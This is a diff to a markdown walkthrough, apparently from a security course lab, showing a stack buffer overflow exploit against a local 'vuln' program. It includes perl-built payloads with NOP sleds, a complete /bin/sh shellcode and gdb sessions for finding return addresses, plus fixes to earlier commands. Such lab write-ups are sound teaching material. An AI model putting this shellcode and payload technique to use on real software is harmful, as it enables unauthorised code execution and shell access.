@@ -105,7 +105,7 @@ It seems like we can not edit the part of the memory where our "back_to_vul" is 
 ### Step by step :walking:
 **1. Arguments** Here we are going to play with the stack of the program itself, needing to access its arguments.  This means that if we change the size of the elements we pass to the program, our stack will be modified, and the address we need to access its content too.  Therefore, I will start by giving my program all the arguments it will needs (at least the right number), and only modify the values passed themself later on.  
  - Our first argument will be very similar to what we did before, 30 characters and and address: `perl -e 'print "\x90"x30 . "\x42"x4'`.  
- - The second argument is simply an address: `perl -e 'print "\x90"x30 . "\x60\x61\x62\x63"'`.  
+ - The second argument is simply an address: `perl -e 'print "\x60\x61\x62\x63"'`.  
  - The shellcode we are goind to use is the same as in the previous practical session, it can be generated and passed to the program this way: `perl -e 'print "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`.  This our third argument.
 
 **2. Finding $eip location in stack**  The address we want our first argument to write in `p` is the one of the return address of the function *f*.  To check find it I first checked what was the next instruction after the call to *f* in the *main* usin disass.  Then I looked up in the stack at which address is this value stored, this is the value I will need to pass in my first argument.
@@ -117,7 +117,7 @@ Dump of assembler code for function main:
    0x0040128a <+39>:    add    $0x10,%esp
    ...
 End of assembler dump.
-$ (gdb) b *0x401285
+(gdb) b *main+34
 Breakpoint 1 at 0x401285
 $ (gdb) run `perl -e 'print "\x40"x30 . "\x42"x4 . " " . "\x60\x61\x62\x63" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
 
@@ -179,11 +179,19 @@ $ (gdb) x/80xw 0xbffff51b
 0xbffff63b:     0x505f554e      0x49464552      0x66783d58      0x002d6563
 0xbffff64b:     0x474e414c      0x45474155      0x5353003d      0x55415f48
 ```
+:pushpin: **Tips** (Credit [@TGLuis](https://github.com/TGLuis)) To find the exact address in memory more easily, you can use the command find in gdb:
+```console
+$ (gdb) find $ebp,0xbfffffff,0x90909090
+0xbffff51b
+0xbffff51c
+...
+18 patterns found.
+```
 
 ### Final solution :running:
-Then we have all we need, we just have to put it all together.  The only issue remaining is that I was only able to launch the shellcode in gdb, and the shell get launched in background by gdb.  Their is a way to force gdb to follow the fork created by the programm we run (`set allow-fork-mode child`).
+Then we have all we need, we just have to put it all together.  The only issue remaining is that I was only able to launch the shellcode in gdb, and the shell get launched in background by gdb.  Their is a way to force gdb to follow the fork created by the programm we run (`set follow-fork-mode child`).
 ```console
-$ (gdb) set allow-fork-mode child
+$ (gdb) set follow-fork-mode child
 $ (gdb) run `perl -e 'print "\x40"x30 . "\x7c\xf2\xff\xbf" . " " . "\x30\xf5\xff\xbf" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
 Starting program: /home/admin/SecurityClass/Tutorial-06/6.2/vuln `perl -e 'print "\x40"x30 . "\x7c\xf2\xff\xbf" . " " . "\x30\xf5\xff\xbf" . " " . "\x90"x21 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"'`
 p=bffff24e       -- before 1st strcpy
